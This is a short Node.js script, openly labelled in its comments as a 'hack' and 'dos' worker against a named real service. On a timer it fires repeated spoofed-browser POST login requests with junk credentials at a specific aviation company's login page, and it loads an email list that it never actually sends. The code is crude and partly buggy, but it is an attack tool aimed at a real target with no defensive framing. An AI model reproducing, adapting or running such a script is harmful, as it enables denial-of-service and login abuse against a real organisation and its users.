//hack the dart fucker
var express = require("express");
var app = express();
app.use(express.logger());
var https = require("https");
var querystring = require("querystring");
var fs = require("fs");
var emails = require("./emailList.json");
//var process = require("process");

var port = process.env.PORT || 5000;

console.log("starting worker dart dos");
var i = 0;
var max = 1;
var delaytime = 100; //mins * secs * millisecs
var idinterval = setInterval(function(){
    //console.log(i++);
    var emailTo = emails.result[i++].email
    //console.log(emailTo+",iteration:"+i+",max:"+max);    
    postDosToDart('turbocharger','fuckit');
    if(i > max)
    {
        clearInterval(idinterval);
        console.log("ending worker process");
    }
},delaytime);

function postDosToDart(username,password)
{
    //console.log("in function post");
    var targetHost = "dart.panasonic.aero";
    var targetPath = "/dart2/login.php";
    var options = {
        host: targetHost,
        post: 443,
        path:targetPath,
        method:'POST',        
    };
    
    var paramsJson = {
      action  :'Login',
      destination:'all_reports_summary.php',
      login_screen_was_seen:1,
      username:username,
      password:password
    };
    var params = querystring.stringify(paramsJson);
    //console.log(params);
    //process.exit(1);
    
    var headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'https://dart.panasonic.aero/dart2/login.php',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': params.length,
        'DNT': '1',
        'Connection': 'keep-alive'
    };
    var req = https.request(options,function(response) {
        console.log('STATUS: ' + response.statusCode);
        console.log('HEADERS: ' + JSON.stringify(response.headers));
        response.setEncoding('utf8');
        response.on('data', function (chunk) {
        //console.log('BODY: ' + chunk);
      });
    });
    
    req.on('error', function(e) {
      console.log('problem with request: ' + e.message);
    });
    
    req.headers = headers;
    req.write(params);
    req.end();
}
